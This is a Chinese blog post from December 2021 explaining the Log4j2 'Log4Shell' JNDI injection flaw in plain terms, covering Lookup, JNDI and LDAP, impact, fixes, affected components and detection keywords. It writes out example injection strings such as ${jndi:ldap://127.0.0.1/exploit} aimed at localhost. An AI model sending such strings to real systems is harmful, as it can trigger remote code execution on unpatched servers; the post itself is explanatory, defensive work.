@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+<!-- Baidu Zhandian -->
+<meta name="baidu-site-verification" content="code-XSNMZ6nzJg" />
+<!-- End Baidu Zhandian -->
+
+
+
+<!-- Baidu Tongji -->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?bba72b854bc55f09037c354079ed388e";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<!-- End Baidu Tongji -->
+
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Log4j核弹级漏洞到底怎么回事？ | Junxin&#39;s Blog | A good memory is not as good as a rotten keyboard.</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="java,漏洞,Log4j">
+    <meta name="description" content="相信大家这两天应该被这么一条新闻刷屏了吧：                                                                                                            这个漏洞到底是怎么回事？核弹级，真的有那么厉害吗？怎么利用这个漏洞呢？  我看了很多技术分析文章，都太过专业，很多非Java技术栈或者不搞安全">
+<meta name="keywords" content="java,漏洞,Log4j">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j核弹级漏洞到底怎么回事？">
+<meta property="og:url" content="https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html">
+<meta property="og:site_name" content="Junxin&#39;s Blog">
+<meta property="og:description" content="相信大家这两天应该被这么一条新闻刷屏了吧：                                                                                                            这个漏洞到底是怎么回事？核弹级，真的有那么厉害吗？怎么利用这个漏洞呢？  我看了很多技术分析文章，都太过专业，很多非Java技术栈或者不搞安全">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://blog.smilexin.cn/img/posts/log4j/bug_news.png">
+<meta property="og:image" content="https://blog.smilexin.cn/img/posts/log4j/640.webp">
+<meta property="og:image" content="https://blog.smilexin.cn/img/posts/log4j/lookup_ways.webp">
+<meta property="og:image" content="https://blog.smilexin.cn/img/posts/log4j/jndi_lookup.webp">
+<meta property="og:image" content="https://blog.smilexin.cn/img/posts/log4j/jndi_impl.webp">
+<meta property="og:image" content="https://blog.smilexin.cn/img/posts/log4j/bug_step.webp">
+<meta property="og:image" content="https://blog.smilexin.cn/img/posts/log4j/usa2016.webp">
+<meta property="og:image" content="https://blog.smilexin.cn/img/posts/log4j/log4j2_jndi1.webp">
+<meta property="og:image" content="https://blog.smilexin.cn/img/posts/log4j/log4j2_jndi2.webp">
+<meta property="og:updated_time" content="2021-12-14T02:29:30.728Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Log4j核弹级漏洞到底怎么回事？">
+<meta name="twitter:description" content="相信大家这两天应该被这么一条新闻刷屏了吧：                                                                                                            这个漏洞到底是怎么回事？核弹级，真的有那么厉害吗？怎么利用这个漏洞呢？  我看了很多技术分析文章，都太过专业，很多非Java技术栈或者不搞安全">
+<meta name="twitter:image" content="https://blog.smilexin.cn/img/posts/log4j/bug_news.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Junxin&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">何俊鑫</h5>
+          <a href="mailto:doubihah@foxmail.com" title="doubihah@foxmail.com" class="mail">doubihah@foxmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/hejx1" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://gitee.com/aixiaodenanhai" target="_blank" >
+                <i class="icon icon-lg icon-link"></i>
+                码云
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Log4j核弹级漏洞到底怎么回事？</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Log4j核弹级漏洞到底怎么回事？</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-12-12T16:00:00.000Z" itemprop="datePublished" class="page-time">
+  2021-12-13
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#log4j2"><span class="post-toc-number">1.</span> <span class="post-toc-text">log4j2</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#JNDI"><span class="post-toc-number">2.</span> <span class="post-toc-text">JNDI</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LDAP"><span class="post-toc-number">3.</span> <span class="post-toc-text">LDAP</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞原理"><span class="post-toc-number">4.</span> <span class="post-toc-text">漏洞原理</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#JNDI-注入"><span class="post-toc-number">5.</span> <span class="post-toc-text">JNDI 注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#影响规模"><span class="post-toc-number">6.</span> <span class="post-toc-text">影响规模</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#修复"><span class="post-toc-number">7.</span> <span class="post-toc-text">修复</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#影响的组件"><span class="post-toc-number">8.</span> <span class="post-toc-text">影响的组件</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#攻击检测"><span class="post-toc-number">9.</span> <span class="post-toc-text">攻击检测</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Log4j核弹级漏洞到底怎么回事？"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Log4j核弹级漏洞到底怎么回事？</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-12-13 00:00:00" datetime="2021-12-12T16:00:00.000Z"  itemprop="datePublished">2021-12-13</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>相信大家这两天应该被这么一条新闻刷屏了吧：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/posts/log4j/bug_news.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<font color="red" size="7">这个漏洞到底是怎么回事？</font><br><font color="red" size="7">核弹级，真的有那么厉害吗？</font><br><font color="red" size="7">怎么利用这个漏洞呢？</font>
+
+<p>我看了很多技术分析文章，都太过专业，很多非Java技术栈或者不搞安全的人只能看个一知半解，导致大家只能看个热闹，对这个漏洞的成因、原理、利用方式、影响面理解的不到位。</p>
+<p>这篇文章，我尝试让所有技术相关的朋友都能看懂：<strong>这个注定会载入网络安全史册上的漏洞，到底是怎么一回事！</strong></p>
+<h1 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h1><p>不管是什么编程语言，不管是前端后端还是客户端，对打日志都不会陌生。</p>
+<p>通过日志，可以帮助我们了解程序的运行情况，排查程序运行中出现的问题。</p>
+<p>在Java技术栈中，用的比较多的日志输出框架主要是<code>log4j2</code>和<code>logback</code>。</p>
+<p>今天讨论的主角就是<code>log4j2</code>。</p>
+<p>我们经常会在日志中输出一些变量，比如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.info(<span class="string">"client ip: &#123;&#125;"</span>, clientIp)</span><br></pre></td></tr></table></figure>
+<p>现在思考一个问题：</p>
+<p>假如现在想要通过日志输出一个Java对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，这种时候怎么办呢？</p>
+<p>log4j2的强大之处在于，除了可以输出程序中的变量，它还提供了一个叫<code>Lookup</code>的东西，可以用来输出更多内容：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/posts/log4j/640.webp" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>lookup，顾名思义就是查找、搜索的意思，那在log4j2中，就是允许在输出日志的时候，通过某种方式去查找要输出的内容。</p>
+<p>lookup相当于是一个接口，具体去哪里查找，怎么查找，就需要编写具体的模块去实现了，类似于面向对象编程中多态那意思。</p>
+<p>好在，log4j2已经帮我们把常见的查找途径都进行实现了：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/posts/log4j/lookup_ways.webp" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>具体每一个的意思，这里就不详述了，这不是本文的重点。</p>
+<h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>主要来看其中那个叫JNDI的东西：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/posts/log4j/jndi_lookup.webp" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<blockquote>
+<p>JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
+</blockquote>
+<p>看不懂？看不懂就对了！</p>
+<p>简单粗暴理解：有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</p>
+<p>那不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装，在它下面也支持很多种具体的数据源。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/posts/log4j/jndi_impl.webp" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h1 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h1><p>继续把目光聚焦，咱们只看这个叫<strong>LDAP</strong>的东西。</p>
+<blockquote>
+<p>LDAP即Lightweight Directory Access Protocol（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。</p>
+</blockquote>
+<p>看不懂？看不懂就对了！</p>
+<p>这个东西用在统一身份认证领域比较多，但今天也不是这篇文章的重点。你只需要简单粗暴理解：有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>好了，有了以上的基础，再来理解这个漏洞就很容易了。</p>
+<p>假如某一个Java程序中，将浏览器的类型记录到了日志中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String userAgent = request.getHeader(<span class="string">"User-Agent"</span>);</span><br><span class="line">logger.info(userAgent);</span><br></pre></td></tr></table></figure>
+<p>网络安全中有一个准则：<strong>不要信任用户输入的任何信息</strong>。</p>
+<p>这其中，<code>User-Agent</code>就属于外界输入的信息，而不是自己程序里定义出来的。只要是外界输入的，就有可能存在恶意的内容。</p>
+<p>假如有人发来了一个HTTP请求，他的User-Agent是这样一个字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1/exploit&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来，log4j2将会对这行要输出的字符串进行解析。</p>
+<p>首先，它发现了字符串中有 <code>${}</code>，知道这个里面包裹的内容是要单独处理的。</p>
+<p>进一步解析，发现是JNDI扩展内容。</p>
+<p>再进一步解析，发现了是LDAP协议，LDAP服务器在127.0.0.1，要查找的key是exploit。</p>
+<p>最后，调用具体负责LDAP的模块去请求对应的数据。</p>
+<p>如果只是请求普通的数据，那也没什么，但问题就出在还可以请求Java对象！</p>
+<p>Java对象一般只存在于内存中，但也可以通过序列化的方式将其存储到文件中，或者通过网络传输。</p>
+<p>如果是自己定义的序列化方式也还好，但更危险的在于：JNDI还支持一个叫命名引用（Naming References）的方式，可以通过远程下载一个class文件，然后下载后加载起来构建对象。</p>
+<blockquote>
+<p>PS：有时候Java对象比较大，直接通过LDAP这些存储不方便，就整了个类似于二次跳转的意思，不直接返回对象内容，而是告诉你对象在哪个class里，让你去那里找。</p>
+</blockquote>
+<p>注意，这里就是核心问题了：<strong>JNDI可以远程下载class文件来构建对象！！！</strong></p>
+<p>危险在哪里？</p>
+<p>如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，那不就完犊子了吗？</p>
+<p>还没看懂？没关系，我画了一张图：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/posts/log4j/bug_step.webp" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>这就是鼎鼎大名的JNDI注入攻击！</p>
+<p>其实除了LDAP，还有RMI的方式，有兴趣的可以了解下。</p>
+<h1 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h1><p>其实这种攻击手法不是这一次出现了，早在2016的blackhat大会上，就有大佬披露了这种攻击方式。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/posts/log4j/usa2016.webp" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>回过头来看，问题的核心在于：</p>
+<p>Java允许通过JNDI远程去下载一个class文件来加载对象，如果这个远程地址是自己的服务器，那还好说，如果是可以被外界来指定的地址，那就要出大问题！</p>
+<p>前面的例子中，一直用的127.0.0.1来代替LDAP服务器地址，那如果输入的User-Agent字符串中不是这个地址，而是一个恶意服务器地址呢？</p>
+<h1 id="影响规模"><a href="#影响规模" class="headerlink" title="影响规模"></a>影响规模</h1><p>这一次漏洞的影响面之所以如此之大，主要还是log4j2的使用面实在是太广了。</p>
+<p>一方面现在Java技术栈在Web、后端开发、大数据等领域应用非常广泛，国内除了阿里巴巴、京东、美团等一大片以Java为主要技术栈的公司外，还有多如牛毛的中小企业选择Java。</p>
+<p>另一方面，还有好多像kafka、elasticsearch、flink这样的大量中间件都是用Java语言开发的。</p>
+<p>在上面这些开发过程中，大量使用了log4j2作为日志输出。只要一个不留神，输出的日志有外部输入混进来，那直接就是远程代码执行RCE，灭顶之灾！</p>
+<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>新版的log4j2已经修复了这个问题，大家赶紧升级。</p>
+<p>下面是log4j2官网中关于JNDI lookup的说明：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/posts/log4j/log4j2_jndi1.webp" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>我通过搜索引擎找到了缓存的12月10号前的快照，大家对比一下，比起下面这个缓存，上面那一版多了哪些东西？</p>
+<p><img src="/img/posts/log4j/log4j2_jndi2.webp" alt=""></p>
+<p>答案是：修复后的log4j2在JNDI lookup中增加了很多的限制：</p>
+<blockquote>
+<ol>
+<li>默认不再支持二次跳转（也就是命名引用）的方式获取对象</li>
+<li>只有在log4j2.allowedLdapClasses列表中指定的class才能获取。</li>
+<li>只有远程地址是本地地址或者在log4j2.allowedLdapHosts列表中指定的地址才能获取</li>
+</ol>
+</blockquote>
+<p>以上几道限制，算是彻底封锁了通过打印日志去远程加载class的这条路了。</p>
+<h1 id="影响的组件"><a href="#影响的组件" class="headerlink" title="影响的组件"></a>影响的组件</h1><p>可能的受影响应用及组件（包括但不限于）如下：</p>
+<ul>
+<li>Apache Solr</li>
+<li>Apache Flink</li>
+<li>Apache Druid</li>
+<li>Apache Struts2</li>
+<li>srping-boot-strater-log4j2</li>
+<li>Elasticsearch</li>
+<li>flume</li>
+<li>dubbo</li>
+<li>Redis</li>
+<li>logstash</li>
+<li>kafka</li>
+</ul>
+<p><strong>幸运的是大家目前普遍使用的<code>springboot</code>中默认使用日志组件<code>logback</code>没有这个问题。</strong></p>
+<p>更多组件可参考如下链接：<a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1</a></p>
+<h1 id="攻击检测"><a href="#攻击检测" class="headerlink" title="攻击检测"></a>攻击检测</h1><ol>
+<li>可以通过检查日志中是否存在 “jndi:ldap://”、“jndi:rmi” 等字符来发现可能的攻击行为。攻击者在利用前通常采用dnslog方式进行扫描、探测，对于常见利用方式可通过应用系统报错日志中的”javax.naming.CommunicationException”、”javax.naming.NamingException: problem generating object using object factory”、”Error looking up JNDI resource”关键字进行排查。</li>
+<li>攻击者的数据包中可能存在：”${jndi:}” 字样，攻击代码举例如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.error(<span class="string">"$&#123;jndi:ldap://127.0.0.1:1389/test&#125;"</span>);</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2021-12-14T02:29:30.728Z" itemprop="dateUpdated">2021-12-14 10:29:30</time>
+</span><br>
+
+
+        
+        原文链接：<a href="/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html" target="_blank" rel="external">https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://blog.smilexin.cn">
+            <img src="/img/avatar.jpg" alt="何俊鑫">
+            何俊鑫
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Log4j/">Log4j</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html&title=《Log4j核弹级漏洞到底怎么回事？》 — Junxin's Blog&pic=https://blog.smilexin.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html&title=《Log4j核弹级漏洞到底怎么回事？》 — Junxin's Blog&source=A good memory is not as good as a rotten keyboard." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Log4j核弹级漏洞到底怎么回事？》 — Junxin's Blog&url=https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html&via=https://blog.smilexin.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/11/15/肌酸服用记录.html" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">肌酸服用记录</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <!-- CHANGYAN BEGIN -->
+	<!--PC版-->
+	<div id="SOHUCS" ></div>
+	<script charset="utf-8" type="text/javascript" src="https://cy-cdn.kuaizhan.com/upload/changyan.js" ></script>
+	<script type="text/javascript">
+	window.changyan.api.config({
+	appid: 'cyvtmihsK',
+	conf: 'prod_d5864dff0a37bf1ed7912f966f469bab'
+	});
+	</script>
+    <!-- CHANGYAN END -->
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢打赏.
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>何俊鑫 &copy; 2017 - 2021</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html&title=《Log4j核弹级漏洞到底怎么回事？》 — Junxin's Blog&pic=https://blog.smilexin.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html&title=《Log4j核弹级漏洞到底怎么回事？》 — Junxin's Blog&source=A good memory is not as good as a rotten keyboard." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Log4j核弹级漏洞到底怎么回事？》 — Junxin's Blog&url=https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html&via=https://blog.smilexin.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://blog.smilexin.cn/2021/12/13/Log4j核弹级漏洞到底怎么回事？.html" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvElEQVR42u3a0YrbMBAF0Pz/T6fQp0Ia994Zy0vh+Ck4iaOjBWn2jl6v+Hr/vl7l9ee3Pp/w7Znvj2szBjw8PLwTvPfllQ/08zPtEBNwPmY8PDy807x7l/Vr5PXQZ9vM1/t4eHh4P8qbLdyzAv16QvHw8PD+F97s//1v1KRkz8t6PDw8vOd5SRiRDDf/Vh7jPpS14OHh4cW8TSvrp14f7O/h4eHhLbrq7eI7e8J1hJFvBn95Ph4eHt4BXtuCasvZJIDIeflnhh02PDw8vBGvXcrzZti9bbCiwYaHh4f3CG/WGMsZbUS72Zzw8PDw7uXNlvj9QYGWnccTxc6Dh4eHt+YlEUB7Z7ORbKYDDw8P73lePrgcOZvEPIb42t/Dw8PDu5WXN6JyXt76msWySbsODw8P7xwvKXbbQ1Fto2s2QdEdPDw8vAO82TKds2fxbv5b0TPx8PDwDvBmA2obY5vTDfkUFOcj8PDw8Ba8BJC/e9dSnk9iUVLj4eHhHeBtIt12yW6jjTY6wcPDwzvBy5f+TYPqmndXu+sfJyPw8PDwbuLNjlUlP7OJaNuifNXlw8PDwyt5bfC6GWIeKLRF+dfXeHh4eA/yZg9Not7Nr9RTj4eHh3eAl7SgNu2oWcNs/wfAw8PDe4aXF8Gb+3khnpT7bdyMh4eHd4K3OQjVFu75t/IN7IYiGw8PDy/g5YtyvnDnpXbbhKvLazw8PLxjvDyczVfddog37GabEw14eHh4iwZYsrgn09FWuTfHHHh4eHinEtQbgolZ0dy2zdqyGw8PD+8cLw8g8nZ+uw3sD4FFYQQeHh7erbx8Wd8EGUnzbFagF6ch8PDw8B7n5bV5/m77nNXhKjw8PLwHeW18kAwlL7LbkAIPDw/vNC8PAjbHEdoDXrMpwMPDwzvNmzXA2rI7Dx1mra8VEg8PDy/l/QLk6ivwudEMewAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
